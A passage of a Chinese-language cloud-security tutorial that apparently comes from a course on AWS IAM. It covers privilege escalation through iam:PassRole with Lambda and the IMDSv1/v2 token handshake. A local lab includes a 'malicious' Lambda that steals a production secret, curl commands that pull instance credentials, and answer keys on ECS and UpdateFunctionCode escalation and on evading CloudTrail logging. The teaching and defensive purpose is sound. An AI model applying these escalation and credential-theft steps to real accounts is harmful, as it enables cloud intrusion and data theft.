      "Sid": "AllowDevOperationalAndDeployActions",
      "Effect": "Allow",
      "Action": [
        "lambda:CreateFunction",
        "lambda:InvokeFunction",
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents",
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": [
        "arn:aws:lambda:ap-northeast-1:123456789012:function:nexuspay-dev-*",
        "arn:aws:logs:ap-northeast-1:123456789012:log-group:/aws/lambda/nexuspay-dev-*",
        "arn:aws:s3:::nexuspay-dev-artifacts/*"
      ]
    },
    {
      "Sid": "AllowPassDevExecRoleInBoundary",
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "arn:aws:iam::123456789012:role/nexuspay-dev-lambda-exec",
      "Condition": {
        "StringEquals": {
          "iam:PassedToService": "lambda.amazonaws.com"
        }
      }
    },
    {
      "Sid": "ExplicitDenyProdSecretsAndBackups",
      "Effect": "Deny",
      "Action": [
        "secretsmanager:*",
        "s3:*"
      ],
      "Resource": [
        "arn:aws:secretsmanager:ap-northeast-1:123456789012:secret:nexuspay/prod/*",
        "arn:aws:s3:::nexuspay-ledger-backup-prod",
        "arn:aws:s3:::nexuspay-ledger-backup-prod/*"
      ]
    },
    {
      "Sid": "DenyBoundaryTampering",
      "Effect": "Deny",
      "Action": [
        "iam:DeleteRolePermissionsBoundary",
        "iam:PutRolePermissionsBoundary",
        "iam:DeletePolicyVersion",
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion"
      ],
      "Resource": "*"
    }
  ]
}
```

這樣一來，兩頭的破口都被封死了：`nexuspay-dev-deployer` 再也沒辦法把生產環境的 `nexuspay-prod-secrets-reader` 掛給 Lambda（另外如果團隊有開放開發角色自己呼叫 `iam:CreateRole`，記得也要在 `iam:CreateRole` 上面加一條 `iam:PermissionsBoundary` 條件，強迫它新建出來的任何角色都必須帶著同一張緊箍咒出生）。

同時，因為被傳遞出去的 `nexuspay-dev-lambda-exec` 身上也綁著這張寫了 `ExplicitDenyProdSecretsAndBackups` 的 Boundary，就算有人不小心在它的 Identity Policy 多開了權限，它在策略交集與顯式拒絕的夾擊下，也絕對摸不到 `nexuspay/prod/db-credentials` 和 `nexuspay-ledger-backup-prod`。

---

## 動手做

- **難度**：進階
- **預估時間**：50 分鐘

這個實驗完全在你的本機上跑，不用綁信用卡、零雲端費用（先把容器映像拉好就能完全離線操作）。我們會用 Docker 跑一套 **LocalStack**（社群版）加上一支輕量的 Python IMDS 模擬器（請先確認本機有 `docker`、`python3` 與 `aws` CLI），親手體驗 IMDSv1 與 IMDSv2 的線路層差異，並在本地跑通 `iam:PassRole` + `lambda:CreateFunction` 偷取生產密鑰的攻擊鏈與策略修補。

### 步驟 1：啟動本地 LocalStack 與 IMDSv1/v2 模擬器

先在終端機設好測試用的假金鑰（搭配 `--endpoint-url=http://localhost:4566` 只會打本機容器，不會連去真正的 AWS），把開啟了 `iam,lambda,sts,secretsmanager,s3` 服務的 LocalStack 跑起來：

```bash
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=ap-northeast-1

docker run -d --rm --name nexuspay-localstack \
  -p 4566:4566 \
  -e SERVICES=iam,lambda,sts,secretsmanager,s3 \
  localstack/localstack:3.8
```

接著用 Python 跑一個監聽在 `127.0.0.1:8169` 的本地 IMDS 模擬器（這支教學腳本用 `X-Lab-Mode` 標頭來切換 v1 / v2 模式，幫助我們觀察 HTTP 方法與標頭檢查行為）：

```bash
cat <<'EOF' > /tmp/mock_imds.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import json, secrets

TOKENS = set()
CREDS = {
    "Code": "Success",
    "AccessKeyId": "ASIATESTNEXUSPAYDEV1",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token": "FwoGZXIvYXdzEBYaDMockSessionTokenForDevDeployer",
    "Expiration": "2026-11-21T18:00:00Z"
}

class IMDSHandler(BaseHTTPRequestHandler):
    def do_PUT(self):
        if self.path == "/latest/api/token":
            if "X-Forwarded-For" in self.headers:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"X-Forwarded-For not allowed in IMDSv2")
                return
            ttl = self.headers.get("X-aws-ec2-metadata-token-ttl-seconds")
            if not ttl or not ttl.isdigit() or not (1 <= int(ttl) <= 21600):
                self.send_response(400)
                self.end_headers()
                return
            tok = secrets.token_urlsafe(32)
            TOKENS.add(tok)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(tok.encode())
            return
        self.send_response(404)
        self.end_headers()

    def do_GET(self):
        mode = self.headers.get("X-Lab-Mode", "v2")
        if mode == "v2":
            tok = self.headers.get("X-aws-ec2-metadata-token")
            if tok not in TOKENS:
                self.send_response(401)
                self.end_headers()
                self.wfile.write(b"Unauthorized: IMDSv2 token required")
                return
        if self.path == "/latest/meta-data/iam/security-credentials/":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"nexuspay-dev-deployer")
        elif self.path == "/latest/meta-data/iam/security-credentials/nexuspay-dev-deployer":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(json.dumps(CREDS).encode())
        else:
            self.send_response(404)
            self.end_headers()

HTTPServer(("127.0.0.1", 8169), IMDSHandler).serve_forever()
EOF
python3 /tmp/mock_imds.py &
```

現在連打四組 `curl`，比對看看 IMDSv1 與 IMDSv2 的反應：

```bash
# 1. 模擬 IMDSv1 沒關時，一發 GET 直接拿走整包憑證
curl -s -H "X-Lab-Mode: v1" \
  http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/nexuspay-dev-deployer

# 2. 強制 IMDSv2 後，不帶 Token 的 GET 當場吃到 401 Unauthorized
curl -i -s http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/

# 3. 模擬經過反向代理的 SSRF (帶有 X-Forwarded-For) 去申請 Token → 吃到 400 Bad Request
curl -i -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  -H "X-Forwarded-For: 203.0.113.10" \
  http://127.0.0.1:8169/latest/api/token

# 4. 本機行程走正規兩階段握手：先 PUT 換 Token，再帶 Token 發 GET 讀出憑證
TOKEN=$(curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://127.0.0.1:8169/latest/api/token)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/nexuspay-dev-deployer
```

### 步驟 2：在 LocalStack 建立生產密鑰與兩個 IAM 角色

等 LocalStack 啟動好之後，我們把生產環境的帳本資料庫密鑰 `nexuspay/prod/db-credentials`、高權限角色 `nexuspay-prod-secrets-reader`，以及帶有 `Resource: "*"` 破口的開發角色 `nexuspay-dev-deployer` 建進 LocalStack。因為 LocalStack 免費社群版預設不會強制攔截 IAM 權限，我們會在步驟 3 多跑一支獨立的 Python 策略評估器，精準驗算修補前後的 IAM 判定結果：

```bash
ENDPOINT="--endpoint-url=http://localhost:4566"

# 1. 建立生產環境帳本資料庫密鑰
aws $ENDPOINT secretsmanager create-secret \
  --name nexuspay/prod/db-credentials \
  --secret-string '{"db_user":"nexus_prod","db_pass":"S3cr3tLedgerPass!"}'

# 2. 建立高權限角色 nexuspay-prod-secrets-reader (允許 Lambda 扮演並讀取密鑰)
cat <<'EOF' > /tmp/lambda-trust.json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Service": "lambda.amazonaws.com"},
    "Action": "sts:AssumeRole"
  }]
}
EOF

aws $ENDPOINT iam create-role \
  --role-name nexuspay-prod-secrets-reader \
  --assume-role-policy-document file:///tmp/lambda-trust.json

cat <<'EOF' > /tmp/prod-secrets-policy.json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "secretsmanager:GetSecretValue",
    "Resource": "*"
  }]
}
EOF

aws $ENDPOINT iam put-role-policy \
  --role-name nexuspay-prod-secrets-reader \
  --policy-name ReadProdSecrets \
  --policy-document file:///tmp/prod-secrets-policy.json

# 3. 建立開發部署角色 nexuspay-dev-deployer 與修補前的脆弱策略 (PassRole Resource: "*")
cat <<'EOF' > /tmp/ec2-trust.json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Service": "ec2.amazonaws.com"},
    "Action": "sts:AssumeRole"
  }]
}
EOF

aws $ENDPOINT iam create-role \
  --role-name nexuspay-dev-deployer \
  --assume-role-policy-document file:///tmp/ec2-trust.json

cat <<'EOF' > /tmp/deployer-vuln-policy.json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowDevLambdaDeploy",
      "Effect": "Allow",
      "Action": ["lambda:CreateFunction", "lambda:InvokeFunction"],
      "Resource": "arn:aws:lambda:ap-northeast-1:000000000000:function:nexuspay-dev-*"
    },
    {
      "Sid": "AllowPassRoleWildcard",
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "*"
    },
    {
      "Sid": "ExplicitDenyProdSecrets",
      "Effect": "Deny",
      "Action": ["secretsmanager:*", "s3:GetObject"],
      "Resource": "*"
    }
  ]
}
EOF

aws $ENDPOINT iam put-role-policy \
  --role-name nexuspay-dev-deployer \
  --policy-name DeployerPolicy \
  --policy-document file:///tmp/deployer-vuln-policy.json
```

### 步驟 3：借殼建立 Lambda 偷出密鑰，並驗證修補後的策略攔截

接著我們寫一支只有 8 行的惡意 Lambda 腳本，在 `create-function` 時把高權限的 `nexuspay-prod-secrets-reader` 綁上去並觸發執行，然後再把 `nexuspay-dev-deployer` 的策略換成鎖緊後的版本，跑一次策略評估腳本比對結果（做完實驗記得跑 `docker stop nexuspay-localstack` 並殺掉背景的 `/tmp/mock_imds.py`）：

```bash
cat <<'EOF' > /tmp/exfil_lambda.py
import boto3, os

def handler(event, context):
    endpoint = f"http://{os.environ.get('LOCALSTACK_HOSTNAME', 'localhost')}:4566"
    sm = boto3.client("secretsmanager", endpoint_url=endpoint, region_name="ap-northeast-1")
    resp = sm.get_secret_value(SecretId="nexuspay/prod/db-credentials")
    return {"stolen_secret": resp["SecretString"]}
EOF

zip -j /tmp/exfil_lambda.zip /tmp/exfil_lambda.py

aws $ENDPOINT lambda create-function \
  --function-name nexuspay-dev-audit-tmp \
  --runtime python3.11 \
  --role arn:aws:iam::000000000000:role/nexuspay-prod-secrets-reader \
  --handler exfil_lambda.handler \
  --zip-file fileb:///tmp/exfil_lambda.zip

aws $ENDPOINT lambda invoke \
  --function-name nexuspay-dev-audit-tmp \
  /tmp/lambda-out.json && cat /tmp/lambda-out.json
```

### 外部靶場對照檢查點

本地演練完後，推薦去打兩個專門練雲端 IAM 與中繼資料攻防的知名靶場：

1. **flaws2.cloud**（http://flaws2.cloud/ ）：完全免費的線上靶場，分成 Attacker（攻擊者）與 Defender（防守者）兩條路線。你可以實際練習從容器環境偷出 STS 臨時憑證，還能親眼看著真實的 CloudTrail JSON 日誌，練習怎麼從一堆事件裡揪出異常的 `AssumeRole` 與橫向移動軌跡。
2. **CloudGoat**（Rhino Security Labs 開源的 AWS 靶場）：裡面有超多經典的 `iam:PassRole`、`lambda:UpdateFunctionCode` 與跨服務提權題組。**特別提醒費用與安全邊界**：CloudGoat 是用 Terraform 在你自己的測試 AWS 帳號裡開真實資源（會產生小額雲端費用），打完收工務必立刻跑 `cloudgoat destroy` 確認資源全數清空，而且絕對不要在公司或生產環境的 AWS 帳號裡跑！

---

### 參考解答

#### 1. 借殼 Lambda 執行結果與策略修補驗證

在步驟 3 呼叫 `aws lambda invoke` 之後，打開 `/tmp/lambda-out.json` 會直接看到被偷出來的生產資料庫密碼：
`{"stolen_secret": "{\"db_user\":\"nexus_prod\",\"db_pass\":\"S3cr3tLedgerPass!\"}"}`

接著我們把 `nexuspay-dev-deployer` 的策略換成只准傳遞 `nexuspay-dev-lambda-exec`（而且強制要求 `iam:PassedToService: lambda.amazonaws.com`）的修補版，並用下面這支 Python 評估腳本驗算修補前後的差異：

```bash
cat <<'EOF' > /tmp/deployer-patched-policy.json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowDevLambdaDeploy",
      "Effect": "Allow",
      "Action": ["lambda:CreateFunction", "lambda:InvokeFunction"],
      "Resource": "arn:aws:lambda:ap-northeast-1:000000000000:function:nexuspay-dev-*"
    },
    {
      "Sid": "RestrictPassRoleToDevExecutionRoleOnly",
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "arn:aws:iam::000000000000:role/nexuspay-dev-lambda-exec",
      "Condition": {
        "StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}
      }
    },
    {
      "Sid": "ExplicitDenyProdSecrets",
      "Effect": "Deny",
      "Action": ["secretsmanager:*", "s3:GetObject"],
      "Resource": "*"
    }
  ]
}
EOF

aws $ENDPOINT iam put-role-policy \
  --role-name nexuspay-dev-deployer \
  --policy-name DeployerPolicy \
  --policy-document file:///tmp/deployer-patched-policy.json

cat <<'EOF' > /tmp/eval_iam.py
import fnmatch, json

def eval_policy(policy, action, resource, context=None):
    context = context or {}
    allowed = False
    for st in policy["Statement"]:
        acts = [st["Action"]] if isinstance(st["Action"], str) else st["Action"]
        res_list = [st["Resource"]] if isinstance(st["Resource"], str) else st["Resource"]
        if not any(fnmatch.fnmatch(action, a) for a in acts):
            continue
        if not any(fnmatch.fnmatch(resource, r) for r in res_list):
            continue
        cond = st.get("Condition", {}).get("StringEquals", {})
        if any(context.get(k) != v for k, v in cond.items()):
            continue
        if st["Effect"] == "Deny":
            return "EXPLICIT_DENY"
        if st["Effect"] == "Allow":
            allowed = True
    return "ALLOW" if allowed else "IMPLICIT_DENY"

vuln = json.load(open("/tmp/deployer-vuln-policy.json"))
patched = json.load(open("/tmp/deployer-patched-policy.json"))
prod_role = "arn:aws:iam::000000000000:role/nexuspay-prod-secrets-reader"
secret_arn = "arn:aws:secretsmanager:ap-northeast-1:000000000000:secret:nexuspay/prod/db-credentials"
ctx = {"iam:PassedToService": "lambda.amazonaws.com"}

print("直接讀生產密鑰 (修補前):", eval_policy(vuln, "secretsmanager:GetSecretValue", secret_arn))
print("PassRole 傳遞生產角色 (修補前):", eval_policy(vuln, "iam:PassRole", prod_role, ctx))
print("PassRole 傳遞生產角色 (修補後):", eval_policy(patched, "iam:PassRole", prod_role, ctx))
EOF
python3 /tmp/eval_iam.py
```

跑完 `python3 /tmp/eval_iam.py`，螢幕會印出三行清楚的判定：
- `直接讀生產密鑰 (修補前): EXPLICIT_DENY`
- `PassRole 傳遞生產角色 (修補前): ALLOW`
- `PassRole 傳遞生產角色 (修補後): IMPLICIT_DENY`

原本讓攻擊者借殼上市的 `iam:PassRole` 破口，在換掉 `"*"` 之後就被 `IMPLICIT_DENY` 徹底封死了。

---

## 自我檢核

- **難度**：進階
- **預估時間**：20 分鐘

先別往回看，試著用剛推導過的封包跳數與 IAM 評估順序，回答下面 4 個真實雲端架構問題：

1. **為什麼調高 Hop Limit 會害死整台節點**：某位維運工程師發現跑在 EC2 Docker 預設 `bridge` 網路裡的容器拿不到 IMDSv2 Token，於是順手把 EC2 的 `HttpPutResponseHopLimit` 從 `1` 改成了 `2`，問題馬上解決。請從 IPv4 封包 TTL 的運作原理，說明為什麼 `1` 的時候容器拿不到、`2` 的時候就拿得到？這樣改會帶來什麼嚴重的資安後果？
2. **`Explicit Deny` 為什麼攔不住借殼執行**：某個 CI 測試角色 `qa-runner` 身上寫了 `Effect: "Deny", Action: "rds:*", Resource: "*"`，卻同時擁有 `iam:PassRole`（`Resource: "*"`）跟 `ecs:RegisterTaskDefinition` / `ecs:RunTask`。請問攻擊者拿到 `qa-runner` 憑證後，要怎麼繞過那條 `Explicit Deny` 去連進受 IAM 驗證保護的生產環境 RDS？為什麼評估引擎這時候不會觸發那條 `Deny`？
3. **砍了 `PassRole` 還是被提權**：資安團隊在稽核後，把所有開發人員手上的 `iam:PassRole` 權限全部拔光了，只留下 `lambda:UpdateFunctionCode` 跟 `lambda:InvokeFunction` 方便大家修 Bug。請問在什麼條件下，攻擊者連 `iam:PassRole` 都不用，照樣能拿到高權限角色的執行權？
4. **有 `s3:GetObject` 卻吃 403 與消失的下載日誌**：攻擊者偷到一組擁有 `s3:GetObject`（`Resource: "*"`）的 STS 憑證，滿心歡喜在自己的筆電跑 `aws s3 cp` 想下載 `nexuspay-kyc-vault-prod` 裡的客戶身分證照片，結果卻當場收到 `403 AccessDenied`。請說出兩種可能把這筆請求攔下來的防禦機制。反過來說，如果攻擊者真的成功下載了一萬張照片，為什麼公司去翻預設設定的 CloudTrail 卻完全看不到半筆 `GetObject` 紀錄？

---

### 參考解答

1. **為什麼調高 Hop Limit 會害死整台節點**：
   - `HttpPutResponseHopLimit = 1` 代表 Hypervisor 回傳 `PUT /latest/api/token` 的封包時，上面的 IPv4 `TTL`（存活跳數）只有 `1`。如果是宿主機本機上的行程直接去領，因為不用經過路由轉發（`0` 跳），`TTL = 1 > 0` 就能順利拿到 Token；但如果是躲在一層 Docker Bridge / NAT 後面的容器去領，宿主機的 Linux 核心在把回應封包從宿主介面轉發進容器 Network Namespace 的那一刻，會照規矩把 `TTL` 扣 `1`（`1 - 1 = 0`），封包當場被核心丟棄，容器就只會等到連線逾時。
   - 一旦維運工程師把 Hop Limit 調成 `2`，封包轉發一次後 `TTL = 2 - 1 = 1 > 0`，就能活著走進容器裡。這意味著這台節點上**所有**跑在一層 Bridge 後面（且沒被額外防火牆擋住）的容器，只要任何一個小服務中了 SSRF 或 RCE，都能直接伸手領走整台宿主節點掛著的高權限 IAM Role。正確做法是把 Hop Limit 鎖死在 `1`，容器需要權限時改走 IRSA 或 EKS Pod Identity。
2. **`Explicit Deny` 為什麼攔不住借殼執行**：
   - 攻擊者只要用 `ecs:RegisterTaskDefinition` 註冊一個新的容器任務，靠著 `iam:PassRole`（`Resource: "*"`）把帳號裡原本就有 RDS 存取權的高權限角色綁進 `taskRoleArn`，再用 `ecs:RunTask` 把容器跑起來去連 RDS 就行了。
   - 之所以不會觸發 `qa-runner` 身上的 `Explicit Deny`，是因為那條拒絕規則只綁在 `qa-runner` 自己的 Identity Policy 上。當 ECS 容器跑起來並去連 RDS 時，當下的請求呼叫者（Caller Principal）已經換成了那個高權限的 Task Role；評估引擎只會檢查那個新角色的策略與邊界，原本 `qa-runner` 的 Identity Policy 根本不在這次請求的求值範圍內。
3. **砍了 `PassRole` 還是被提權**：
   - 只要帳號裡**已經存在任何一支本來就綁著高權限 Execution Role 的 Lambda 函式**。
   - 因為 AWS 只有在「新建函式」或「修改函式設定以更換 Role」的時候，才會去檢查呼叫者有沒有 `iam:PassRole`。既然那支高權限 Lambda 早就建好了，手握 `lambda:UpdateFunctionCode` 的攻擊者只要直接上傳一份夾帶後門的 ZIP 檔覆蓋掉它的 `$LATEST` 程式碼，接著呼叫 `lambda:InvokeFunction`（或等原本的排程自動觸發），他的後門程式碼就會直接頂著那支函式原本綁好的高權限 Role 執行，完全不需要用到 `iam:PassRole`。
4. **有 `s3:GetObject` 卻吃 403 與消失的下載日誌**：
   - 會吃 `403 AccessDenied` 最常見的兩個原因：第一，那個儲存桶啟用了 **SSE-KMS**（用客戶管理金鑰 CMK 加密），而攻擊者偷到的角色雖然有 `s3:GetObject`，卻沒有那把 KMS 金鑰的 `kms:Decrypt` 解密權限；第二，Bucket Policy、KMS Key Policy 或角色的策略上設了網路位置條件（例如規定 `aws:SourceVpce` 或 `aws:SourceIp` 必須來自公司內網 VPC），攻擊者把憑證搬回自己筆電從公網打過去，條件比對沒過就被直接擋掉。
   - 至於翻遍 CloudTrail 都看不到下載紀錄，是因為 CloudTrail 預設只記錄控制平面的 **Management Events**，**預設完全不記錄 S3 `GetObject` / `PutObject` 這類高頻率的資料平面事件（Data Events）**。如果沒有針對機密儲存桶額外開啟 S3 Data Events，檔案被搬光了也不會在預設的 CloudTrail 裡留下一行紀錄。

---

## 延伸閱讀

- **AWS IAM Documentation — Policy Evaluation Logic**（https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic.html ）：官方最完整的策略評估流程圖，把 Organizations SCP、Permissions Boundary、Session Policy 與跨帳號交集規則講得一清二楚。
- **AWS EC2 Documentation — Configure the Instance Metadata Service (IMDSv2)**（https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html ）：深入解析 `PUT` Session Token、`X-Forwarded-For` 攔截規則，以及容器環境下 `HttpPutResponseHopLimit` 的設計考量。
- **Rhino Security Labs — AWS IAM Privilege Escalation – Methods and Mitigation**（https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/ ）：把 21 種以上的 IAM 提權原語組合（包含 `PassRole`、`UpdateFunctionCode`、`CreatePolicyVersion` 等）與修補方式全部攤開的經典必讀指南。
- **Scott Piper — flaws2.cloud & AWS Security Maturity Roadmap**（http://flaws2.cloud/ 、https://summitroute.com/ ）：結合實戰理論與免費線上靶場的雲端攻防教材，特別適合拿來對照練習 CloudTrail 日誌追查與 STS 憑證鑑識。
